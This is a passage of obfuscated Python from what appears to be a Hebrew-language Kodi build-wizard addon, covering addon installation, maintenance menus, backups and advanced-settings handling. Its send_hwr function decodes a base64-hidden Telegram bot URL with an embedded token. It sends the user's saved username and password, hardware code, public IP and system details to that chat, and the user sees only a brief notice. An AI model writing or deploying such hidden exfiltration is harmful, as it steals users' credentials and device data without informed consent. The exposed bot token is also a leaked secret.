	if not wiz .workingURL (OOO000OOO0O00OOOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0000O0O0O00OO ,COLOR2 ));return #line:1880
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:1881
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0000O0O0O00OO )+'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:1882
	O0000O00OOO000OOO =OOO000OOO0O00OOOO .split ('/')#line:1883
	O000O00OO0OO00OOO =os .path .join (PACKAGES ,O0000O00OOO000OOO [-1 ])#line:1884
	try :os .remove (O000O00OO0OO00OOO )#line:1885
	except :pass #line:1886
	downloader .download (OOO000OOO0O00OOOO ,O000O00OO0OO00OOO ,DP )#line:1887
	OOO0OOOOO0OO0OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0000O0O0O00OO )#line:1888
	DP .update (0 ,OOO0OOOOO0OO0OOOO +'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:1889
	O00000O00000O00O0 ,OO00O00OO0O00O00O ,OOOO00000O00OO00O =extract .all (O000O00OO0OO00OOO ,ADDONS ,DP ,title =OOO0OOOOO0OO0OOOO )#line:1890
	DP .update (0 ,OOO0OOOOO0OO0OOOO +'\n'+''+'\n'+'[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:1891
	installed (O0OO0000O0O0O00OO )#line:1892
	installDep (O0OO0000O0O0O00OO ,DP )#line:1893
	DP .close ()#line:1894
	wiz .ebi ('UpdateAddonRepos()')#line:1895
	wiz .ebi ('UpdateLocalAddons()')#line:1896
	wiz .refresh ()#line:1897
def installDep (O0O0OOOO00OOO0O0O ,DP =None ):#line:1899
	O00OO0O00OOOO00O0 =os .path .join (ADDONS ,O0O0OOOO00OOO0O0O ,'addon.xml')#line:1900
	if os .path .exists (O00OO0O00OOOO00O0 ):#line:1901
		O0OOO000O00O0O000 =open (O00OO0O00OOOO00O0 ,mode ='r');O00OOOOO0OO000O0O =O0OOO000O00O0O000 .read ();O0OOO000O00O0O000 .close ();#line:1902
		OOOOOOO0000OOO000 =wiz .parseDOM (O00OOOOO0OO000O0O ,'import',ret ='addon')#line:1903
		for O0OOOOO00OOOOOOO0 in OOOOOOO0000OOO000 :#line:1904
			if not 'xbmc.python'in O0OOOOO00OOOOOOO0 :#line:1905
				if not DP ==None :#line:1906
					DP .update (0 +'\n'+''+'\n'+'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOOO00OOOOOOO0 ))#line:1907
def installed (OO00O0OOO000O00O0 ):#line:1935
	OO000000OO0O0OOOO =os .path .join (ADDONS ,OO00O0OOO000O00O0 ,'addon.xml')#line:1936
	if os .path .exists (OO000000OO0O0OOOO ):#line:1937
		try :#line:1938
			OOO00OOO00O0O0OOO =open (OO000000OO0O0OOOO ,mode ='r');OO00OOOOOOO0OO0O0 =OOO00OOO00O0O0OOO .read ();OOO00OOO00O0O0OOO .close ()#line:1939
			OO00OOO000OO0OO0O =wiz .parseDOM (OO00OOOOOOO0OO0O0 ,'addon',ret ='name',attrs ={'id':OO00O0OOO000O00O0 })#line:1940
			O00OOO0OOO0OO00OO =os .path .join (ADDONS ,OO00O0OOO000O00O0 ,'icon.png')#line:1941
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOO000OO0OO0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00OOO0OOO0OO00OO )#line:1942
		except :pass #line:1943
def passandpin ():#line:1946
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:1947
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:1948
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:1949
def passandUsername ():#line:1950
	ADDON .openSettings ()#line:1952
def folderback ():#line:1954
    OO0O0OOOO0OOO0OOO =wiz .getS ("path")#line:1955
    if OO0O0OOOO0OOO0OOO :#line:1956
      OO0O0OOOO0OOO0OOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:1957
      ADDON .setSetting ("path",OO0O0OOOO0OOO0OOO )#line:1958
def send_hwr ():#line:1963
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:1964
       try :#line:1965
          import json ,requests #line:1967
          wiz .log ('FRESH MESSAGE')#line:1968
          O00OOOOOO000O0O00 =(wiz .getS ("user"))#line:1969
          OOOOO0OO0O0OOO00O =(wiz .getS ("pass"))#line:1970
          OO0000000OOOOOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1971
          OO0O000OOOOO0OO0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:1972
          OOOOOO00000OOOOOO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:1973
          OO0O0OOOO0OOOOO00 =O00OOOOOO000O0O00 #line:1975
          O0OOO0O00OO000OOO =OOOOO0OO0O0OOO00O #line:1976
          O00OOO0O00OO0OO0O =platform .uname ()#line:1978
          O000OOO00OO00O00O =O00OOO0O00OO0OO0O [1 ]#line:1979
          OOOO0O00O0000OOO0 =requests .get (OO0O000OOOOO0OO0O +que ('שלח קוד: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO0O0OOOO0OOOOO00 +que (' סיסמה: ')+O0OOO0O00OO000OOO +que (' קודי: ')+OO0000000OOOOOO0O +que (' כתובת: ')+OOOOOO00000OOOOOO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O000OOO00OO00O00O ).json ()#line:1980
          OOOO0O00O0000OOO0 =requests .get (OO0O000OOOOO0OO0O +HARDWAER ).json ()#line:1981
          xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1983
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]נשלח[/COLOR]'%COLOR2 )#line:1984
       except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין קוד פנה למנהל[/COLOR]'%COLOR2 )#line:1985
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1986
def backmyupbuild ():#line:1987
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:1989
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:1990
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:1991
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:1993
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:1994
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:1996
def maintMenu (view =None ):#line:1998
	O0OO00O000OO00OO0 ='[B][COLOR green]ON[/COLOR][/B]';O0O00000O0O00OOOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2000
	OOOOOO00OO0000OO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2001
	OOO00OO00O000O0O0 ='true'if AUTOCACHE =='true'else 'false'#line:2002
	OO000O00OO00O00O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2003
	OO0OO0O0O00OO0O00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2004
	O00OOOOOOOOO0O0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2005
	O0O0O000O00O00O00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2006
	OOO00OO000OO0OOO0 ='true'if INCLUDEALL =='true'else 'false'#line:2007
	OOO0O0OO00OOOOOOO ='true'if THIRDPARTY =='true'else 'false'#line:2008
	if wiz .Grab_Log (True )==False :OOO0O0O00O0OO000O =0 #line:2009
	else :OOO0O0O00O0OO000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2010
	if wiz .Grab_Log (True ,True )==False :OO00O0O0O0O00OOO0 =0 #line:2011
	else :OO00O0O0O0O00OOO0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2012
	O0O0O00O0000OO0OO =int (OOO0O0O00O0OO000O )+int (OO00O0O0O0O00OOO0 )#line:2013
	O0OOOOOO0O0OOOOO0 =str (O0O0O00O0000OO0OO )+' Error(s) Found'if O0O0O00O0000OO0OO >0 else 'None Found'#line:2014
	O000OOOO0OO0OO00O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2015
	if OOO00OO000OO0OOO0 =='true':#line:2016
		O000OO0OO0OO0O00O ='true'#line:2017
		OO00OO0O0OO0O0OOO ='true'#line:2018
		OO0O0O0O0O0OO00O0 ='true'#line:2019
		OO0OOO0O0O0000000 ='true'#line:2020
		OOOO0000OOOO00000 ='true'#line:2021
		OO000OO00O0OO0000 ='true'#line:2022
		OO00O0OOO0O0O0O00 ='true'#line:2023
		OOOO0O00O00O0OOOO ='true'#line:2024
	else :#line:2025
		O000OO0OO0OO0O00O ='true'if INCLUDEBOB =='true'else 'false'#line:2026
		OO00OO0O0OO0O0OOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2027
		OO0O0O0O0O0OO00O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2028
		OO0OOO0O0O0000000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2029
		OOOO0000OOOO00000 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2030
		OO000OO00O0OO0000 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2031
		OO00O0OOO0O0O0O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2032
		OOOO0O00O00O0OOOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2033
	OOOOOOOOOOO0000O0 =wiz .getSize (PACKAGES )#line:2034
	OO000OO0O00OO0000 =wiz .getSize (THUMBS )#line:2035
	O000OOO0O0O0OO000 =wiz .getCacheSize ()#line:2036
	OO00OOO0000OOO0O0 =OOOOOOOOOOO0000O0 +OO000OO0O00OO0000 +O000OOO0O0O0OO000 #line:2037
	OOO0OO0000O00OO00 =['Daily','Always','3 Days','Weekly']#line:2038
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2039
	if view =="clean"or SHOWMAINT =='true':#line:2040
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OOO0000OOO0O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2041
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOO0O0O0OO000 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2042
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOOOOOOO0000O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2043
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000OO0O00OO0000 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2044
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2045
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2046
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2047
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2048
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2049
	if view =="addon"or SHOWMAINT =='false':#line:2050
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2051
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2052
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2053
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2054
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2055
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2056
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2057
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2058
	if view =="misc"or SHOWMAINT =='true':#line:2059
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2060
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2061
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2062
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2063
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2064
		addFile ('View Errors in Log: %s'%(O0OOOOOO0O0OOOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2065
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2066
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2067
		addFile ('Clear Wizard Log File%s'%O000OOOO0OO0OO00O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2068
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2069
	if view =="backup"or SHOWMAINT =='true':#line:2070
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2071
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2072
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2073
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2074
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2075
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2076
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2077
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2078
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2079
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2080
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2081
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2082
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2083
	if view =="tweaks"or SHOWMAINT =='true':#line:2084
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2085
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2086
		else :#line:2087
			if os .path .exists (ADVANCED ):#line:2088
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2089
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2090
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2091
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2092
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2093
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2094
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2095
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2096
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2097
	addFile ('Show All Maintenance: %s'%O00OOOOOOOOO0O0O0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2098
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2099
	addFile ('Third Party Wizards: %s'%OOO0O0OO00OOOOOOO .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2100
	if OOO0O0OO00OOOOOOO =='true':#line:2101
		OOO0OOOOOO000O0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2102
		OOO000OO0OO0O0O0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2103
		O00O0OOOOOO00000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2104
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OOOOOO000O0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2105
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO000OO0OO0O0O0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2106
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O0OOOOOO00000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2107
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2108
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOOOOO00OO0000OO0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2109
	if OOOOOO00OO0000OO0 =='true':#line:2110
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOO0OO0000O00OO00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2111
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOO00OO00O000O0O0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2112
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO000O00OO00O00O0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2113
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO0OO0O0O00OO0O00 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2114
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2115
	addFile ('Include Video Cache in Clear Cache: %s'%O0O0O000O00O00O00 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2116
	if O0O0O000O00O00O00 =='true':#line:2117
		addFile ('--- Include All Video Addons: %s'%OOO00OO000OO0OOO0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2118
		addFile ('--- Include Bob: %s'%O000OO0OO0OO0O00O .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2119
		addFile ('--- Include Phoenix: %s'%OO00OO0O0OO0O0OOO .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2120
		addFile ('--- Include Specto: %s'%OO0O0O0O0O0OO00O0 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2121
		addFile ('--- Include Exodus: %s'%OOOO0000OOOO00000 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2122
		addFile ('--- Include Salts: %s'%OO00O0OOO0O0O0O00 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2123
		addFile ('--- Include Salts HD Lite: %s'%OOOO0O00O00O0OOOO .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2124
		addFile ('--- Include One Channel: %s'%OO000OO00O0OO0000 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2125
		addFile ('--- Include Genesis: %s'%OO0OOO0O0O0000000 .replace ('true',O0OO00O000OO00OO0 ).replace ('false',O0O00000O0O00OOOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2126
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2127
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2128
	setView ('files','viewType')#line:2129
def advancedWindow (url =None ):#line:2131
	if not ADVANCEDFILE =='http://':#line:2132
		if url ==None :#line:2133
			OOO00O0O00000O00O =wiz .workingURL (ADVANCEDFILE )#line:2134
			O0O00O00O00OOOOOO =uservar .ADVANCEDFILE #line:2135
		else :#line:2136
			OOO00O0O00000O00O =wiz .workingURL (url )#line:2137
			O0O00O00O00OOOOOO =url #line:2138
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2139
		if os .path .exists (ADVANCED ):#line:2140
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2141
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2142
		if OOO00O0O00000O00O ==True :#line:2143
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2144
			O0O000OO0OOO000O0 =wiz .openURL (O0O00O00O00OOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2145
			O0OOOOO0O00OOO0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O000OO0OOO000O0 )#line:2146
			if len (O0OOOOO0O00OOO0O0 )>0 :#line:2147
				for OO0OOO0OOOO00O000 ,O0OO00O000OOOO0O0 ,url ,O0OOOO00OO0OOOO0O ,O0OOO0O0O0OO00000 ,OOO0OOOOO0000O0OO in O0OOOOO0O00OOO0O0 :#line:2148
					if O0OO00O000OOOO0O0 .lower ()=="yes":#line:2149
						addDir ("[B]%s[/B]"%OO0OOO0OOOO00O000 ,'advancedsetting',url ,description =OOO0OOOOO0000O0OO ,icon =O0OOOO00OO0OOOO0O ,fanart =O0OOO0O0O0OO00000 ,themeit =THEME3 )#line:2150
					else :#line:2151
						addFile (OO0OOO0OOOO00O000 ,'writeadvanced',OO0OOO0OOOO00O000 ,url ,description =OOO0OOOOO0000O0OO ,icon =O0OOOO00OO0OOOO0O ,fanart =O0OOO0O0O0OO00000 ,themeit =THEME2 )#line:2152
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2153
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO00O0O00000O00O )#line:2154
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2155
def writeAdvanced (O00OO0000000OO00O ,OO00O0O0O0OO0OOOO ):#line:2157
	OOO0OO00OOO000000 =wiz .workingURL (OO00O0O0O0OO0OOOO )#line:2158
	if OOO0OO00OOO000000 ==True :#line:2159
		if os .path .exists (ADVANCED ):O00O0O0OO0OOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OO0000000OO00O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2160
		else :O00O0O0OO0OOO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OO0000000OO00O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2161
		if O00O0O0OO0OOO00OO ==1 :#line:2163
			O0O0OO0OO000OOOOO =wiz .openURL (OO00O0O0O0OO0OOOO )#line:2164
			OO00OOOOOO0OOOO0O =open (ADVANCED ,'w');#line:2165
			OO00OOOOOO0OOOO0O .write (O0O0OO0OO000OOOOO )#line:2166
			OO00OOOOOO0OOOO0O .close ()#line:2167
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2168
			wiz .killxbmc (True )#line:2169
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2170
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0OO00OOO000000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2171
def viewAdvanced ():#line:2173
	OO00000OO000OOOO0 =open (ADVANCED )#line:2174
	OO000O00O000O0OO0 =OO00000OO000OOOO0 .read ().replace ('\t','    ')#line:2175
	wiz .TextBox (ADDONTITLE ,OO000O00O000O0OO0 )#line:2176
	OO00000OO000OOOO0 .close ()#line:2177
def removeAdvanced ():#line:2179
	if os .path .exists (ADVANCED ):#line:2180
		wiz .removeFile (ADVANCED )#line:2181
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2182
def showAutoAdvanced ():#line:2184
	notify .autoConfig ()#line:2185
def getIP ():#line:2187
	OO00OO0OO000OOOOO ='http://whatismyipaddress.com/'#line:2188
	if not wiz .workingURL (OO00OO0OO000OOOOO ):return 'Unknown','Unknown','Unknown'#line:2189
	OOOOO00O0OOOOOOOO =wiz .openURL (OO00OO0OO000OOOOO ).replace ('\n','').replace ('\r','')#line:2190
	if not 'Access Denied'in OOOOO00O0OOOOOOOO :#line:2191
		OO0OO0O0OO00OOO00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOOO00O0OOOOOOOO )#line:2192
		OO0O0OO0OOO000OOO =OO0OO0O0OO00OOO00 [0 ]if (len (OO0OO0O0OO00OOO00 )>0 )else 'Unknown'#line:2193
		O000OO0OO00O0O0O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOOO00O0OOOOOOOO )#line:2194
		O0O0O000OOO000000 =O000OO0OO00O0O0O0 [0 ]if (len (O000OO0OO00O0O0O0 )>0 )else 'Unknown'#line:2195
		O00O000O0O000OO0O =O000OO0OO00O0O0O0 [1 ]+', '+O000OO0OO00O0O0O0 [2 ]+', '+O000OO0OO00O0O0O0 [3 ]if (len (O000OO0OO00O0O0O0 )>2 )else 'Unknown'#line:2196
		return OO0O0OO0OOO000OOO ,O0O0O000OOO000000 ,O00O000O0O000OO0O #line:2197
	else :return 'Unknown','Unknown','Unknown'#line:2198
def systemInfo ():#line:2200
